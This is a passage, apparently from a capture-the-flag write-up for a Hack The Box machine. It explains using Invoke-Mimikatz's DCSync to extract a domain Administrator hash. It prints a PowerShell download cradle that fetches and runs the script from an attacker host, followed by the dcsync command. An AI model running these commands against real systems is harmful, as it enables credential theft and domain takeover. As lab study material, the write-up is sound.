P.S. As an alternative, I also used ```Invoke-Mimikatz``` to utilise the DCSync feature to extract the Administrator's hash. The version of the script I used can be found [here](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1), although I had a few problems with it. Specifically, the following two articles helped me fix the bugs I was having:
* [Ambiguous match found error solution](https://github.com/mitre/caldera/issues/38#issuecomment-396055260)
* [AddressWidth cannot be found error solution](https://github.com/EmpireProject/Empire/issues/231#issuecomment-228440044)

Once I had these lines fixed, I ran the following commands from my FullLanguage mode powershell shell and got Administrator's hash:
```bash
PS C:\Users\mrlky.HTB\Documents> iex (new-object net.webclient).DownloadString('http://10.10.12.151:8081/Invoke-Mimikatz.ps1')
PS C:\Users\mrlky.HTB\Documents> Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
```